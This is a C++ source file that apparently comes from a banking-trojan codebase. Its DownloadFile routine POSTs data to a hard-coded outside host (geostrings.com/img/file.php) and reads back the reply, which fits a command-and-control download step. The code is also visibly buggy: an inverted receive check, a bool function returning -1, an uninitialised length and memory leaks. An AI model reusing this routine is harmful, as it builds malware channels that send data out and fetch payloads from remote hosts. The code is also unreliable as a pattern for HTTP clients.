#include <Windows.h>
#include "..\client\core.h"
#include "wsocket.h"
#include "mem.h"
#include "inetlib.h"
#include "debug.h"
#include "str.h"
#include "registry.h"
#include "httptools.h"

bool inetlib::DownloadFile(LPSTR userAgent, LPSTR host, WORD port, MEMDATA* mem, void* postData, DWORD postDataSize)
{
	SOCKET sock = WSocket::tcpConnectA(host, port);
	if(sock == SOCKET_ERROR) {WDEBUG1(WDDT_INFO, "Socket error: %s", host);return false;}

	LPSTR query;
	Str::_sprintfExA(&query, "POST http://geostrings.com/img/file.php HTTP/1.0\r\nAccept: text/html;q=0.7, */*;q=1\r\nUser-Agent: %s\r\nHost: geostrings.com\r\nContent-Length: %u\r\nConnection: Keep-Alive\r\nPragma: no-cache\r\n\r\n", userAgent, postDataSize);
	DWORD querysize = Str::_LengthA(query);
	if(!Mem::reallocEx(query, querysize + postDataSize)) {WDEBUG0(WDDT_INFO, "Error when reallocating query"); Mem::free(query); WSocket::tcpClose(sock); return false;}
	Mem::_copy2(query + querysize + 1, postData, postDataSize);
	if(!WSocket::tcpSend(sock, query, querysize + postDataSize)) {WDEBUG0(WDDT_INFO, "Cannot send the query");return false;}
	void* data = Mem::alloc(REGISTRY_MAX_VALUE_DATA_SIZE);
	DWORD dataSize;
	DWORD contentLength;
	if(!data || (dataSize = WSocket::tcpRecv(sock, data, REGISTRY_MAX_VALUE_DATA_SIZE, 60000)) > 0){WDEBUG0(WDDT_INFO, "Error when downloading");return false;}
	
	//Proverki
	
	LPSTR header;
	DWORD headerSize;

	//Версия.
	header = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_RESPONSE_HTTP_VERSION, &headerSize);
	if(header == NULL || headerSize != 8 || Str::_CompareA("HTTP/1.", header, 7, 7) != 0)
	{
#   if(BO_DEBUG > 0) && defined WDEBUG2
	LPSTR p = Str::_CopyExA(header, headerSize);
	WDEBUG2(WDDT_ERROR, "Bad HTTP-version: header=%S, headerSize=%u", p, headerSize);
	Mem::free(p);
#   endif
	return -1;
	}

	//Код.
	header = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_RESPONSE_STATUS, &headerSize);
	if(header == NULL || !(header[0] == '2' && header[1] == '0' && header[2] == '0'))
	{
#   if defined WDEBUG0
	WDEBUG0(WDDT_ERROR, "Bad response status.");
#   endif
	return -1;
	}
	//Content-Length
	if((header = HttpTools::_getMimeHeader(data, dataSize, "Content-Length", &headerSize)) != NULL)
	{
		LPSTR tmp = Str::_CopyExA(header, headerSize);
		bool bad = (tmp == NULL || (contentLength = (DWORD)Str::_ToInt64A(tmp, NULL)) < 0);
		Mem::free(tmp);
		if(bad)
		{
	#   if(BO_DEBUG > 0) && defined WDEBUG2
			LPSTR p = Str::_CopyExA(header, headerSize);
			WDEBUG2(WDDT_ERROR, "Bad Content-Length header: header=%S, headerSize=%u", p, headerSize);
			Mem::free(p);
	#     endif
			return false;
		}
	}
	LPBYTE dataPos = (LPBYTE)Mem::_findData(data, dataSize, "\r\n\r\n", 4);
	mem->data = Mem::copyEx(dataPos + 4, contentLength);
	mem->size = contentLength;

	WSocket::tcpClose(sock);
	Mem::free(data);
	Mem::free(query);

	return true;
}